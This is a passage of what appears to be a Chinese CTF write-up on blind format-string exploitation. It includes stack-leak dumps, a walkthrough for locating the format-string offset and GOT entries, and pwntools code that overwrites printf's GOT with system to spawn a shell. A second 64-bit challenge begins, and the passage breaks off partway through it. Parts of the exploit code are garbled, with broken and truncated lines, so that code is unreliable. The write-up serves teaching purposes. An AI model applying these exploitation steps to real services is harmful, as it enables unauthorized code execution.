    [*] 680 0xd1f744e6
    [*] 684 (nil)     
    [*] 688 (nil)     
    [*] 692 (nil)     
    [*] 696 0x1       
    [*] 700 0x8048500 
    [*] 704 (nil)     
    [*] 708 0xf7f3dff0
    [*] 712 0xf7f38880
    [*] 716 0xf7f4d000
    [*] 720 0x1       
    [*] 724 0x8048500 
    [*] 728 (nil)     
    [*] 732 0x8048521 
    [*] 736 0x80485fb 
    [*] 740 0x1       
    [*] 744 0xff8e48d4
    [*] 748 0x8048760 
    [*] 752 0x80487c0 
    [*] 756 0xf7f38880
    [*] 760 0xff8e48cc
    [*] 764 0xf7f4d918
    [*] 768 0x1       
    [*] 772 0xff8e5f37
    [*] 776 (nil)     
    [*] 780 0xff8e5f41
    [*] 784 0xff8e5f57
    [*] 788 0xff8e5f5f
    [*] 792 0xff8e5f6a
    [*] 796 0xff8e5f7f
    [*] 800 0xff8e5fc1
    [*] 804 0xff8e5fc7
    [*] 808 0xff8e5fd5
    [*] 812 (nil)     
    [*] 816 0x20      
    [*] 820 0xf7f28070
    [*] 824 0x21      
    [*] 828 0xf7f27000
    [*] 832 0x10      
    [*] 836 0xf8bfbff 
    [*] 840 0x6       
    [*] 844 0x1000    
    [*] 848 0x11      
    [*] 852 0x64      
    [*] 856 0x3       
    [*] 860 0x8048034 
    [*] 864 0x4       
    [*] 868 0x20      
    [*] 872 0x5       
    [*] 876 0x9       
    [*] 880 0x7       
    [*] 884 0xf7f29000
    [*] 888 0x8       
    [*] 892 (nil)     
    [*] 896 0x9       
    [*] 900 0x8048500 
    [*] 904 0xb       
    [*] 908 0x3e8     
    [*] 912 0xc       
    [*] 916 0x3e8     
    [*] 920 0xd       
    [*] 924 0x3e8     
    [*] 928 0xe       
    [*] 932 0x3e8     
    [*] 936 0x17      
    [*] 940 (nil)     
    [*] 944 0x19      
    [*] 948 0xff8e49ab
    [*] 952 0x1a      
    [*] 956 (nil)     
    [*] 960 0x1f      
    [*] 964 0xff8e5fee
    [*] 968 0xf       
    [*] 972 0xff8e49bb
    [*] 976 (nil)     
    [*] 980 (nil)     
    [*] 984 0x3f000000
    [*] 988 0x55b90088
    [*] 992 0x5484b0ce
    [*] 996 0x96a61291
    [*] 1000 0x69827162
    [*] 1004 0x363836  
    [*] 1008 (nil)     
    ....... (nil)     
    [*] 1112 (nil)
此处我们发现了在泄露序号为700和724的位置出现了相同的明显位于`.text`段中的相同地址，这就是`_start`函数的地址。
同时也已经发现了格式化字符串位于288处，即偏移为72，构建偏移，泄露文件。
注意此处因为`_start`函数地址末尾以`x00`结尾，那么我们首先先将地址+1，泄露完毕后再手动填入一字节`x31`
**IDA文件修复 &分析**
填入偏移，修复`_start`函数，`main`函数，反编译。
我们显然可以确定printf的plt表地址为`0x8048470`
**泄露printf的got表地址**
我们接下来泄露`printf[@plt](https://github.com/plt
"@plt")`也就是`0x8048470`处的指令内容，以获取`printf[@got](https://github.com/got
"@got")`的位置。
    printf_plt=0x8048470
    payload = 'Leak-->%78$s')
    print(disasm(sh.recvuntil('%78$s')
                value = sh.recvuntil('%78$s')
    # print(disasm(sh.recvuntil('%78$s')
    printf_addr=u32(sh.recvuntil('> 8
    payload  = '%' + str(system_addr_byte_1 - 9) + 'c' + '%87$hhn'
    payload += '%' + str(system_addr_byte_2 - system_addr_byte_1 + 9 - 0x100) + 'c' + '%88$hn'
    payload  = payload.ljust(0x32+1)
    payload += p32(printf_got)+p32(printf_got+1)
    sh.recvuntil('Please tell me:')
    sh.sendline(payload)
    # gdb.attach(sh)
    sh.sendline(';/bin/shx00')
    sh.interactive()
    # print(sh.recv())
###  以axb_2019_fmt64为例
⚠：本题目在BUUOJ上已被搭建，但是题目给出了源文件，原题为盲打题目，此处也只利用nc接口解题。
题目给了一个txt文件，内容如下：
    $ readelf -s stilltest
    Symbol table '.dynsym' contains 15 entries:
       Num:    Value          Size Type    Bind   Vis      Ndx Name
         0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
         1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
         2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)
         3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.2.5 (2)
         4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)
         5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.2.5 (2)
         6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.2.5 (2)
         7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (2)
         8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
         9: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
        10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sprintf@GLIBC_2.2.5 (2)
        11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (2)
        12: 0000000000601080     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2)
        13: 0000000000601090     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5 (2)
        14: 00000000006010a0     8 OBJECT  GLOBAL DEFAULT   26 stderr@GLIBC_2.2.5 (2)
我们还是先尝试泄露源文件。
**Leak Stack & Where is `.text`**
这里泄露的数据中出现了大量的`(nil)`，重复部分已被隐去。
    [*] 0    %0$p      
    [*] 8    0x1       
    [*] 16   0xfffffffffff80000
    [*] 24   (nil)     
    [*] 32   0xffff    
    [*] 40   0x13      
    [*] 48   0x7f8314c7d410
    [*] 56   0x1315257000
    [*] 64   0x7c2d2d3c70243825
    [*] 72   0xa       
    [*] 80   (nil)     
    [*] ..   (nil)   
    [*] 312  (nil)     
    [*] 320  0x300     
    [*] 328  (nil)     
    [*] 336  0x7265746165706552
    [*] 344  0x2d3c70243334253a
    [*] 352  0xa0a7c2d 
    [*] 360  (nil)     
    [*] ...  (nil)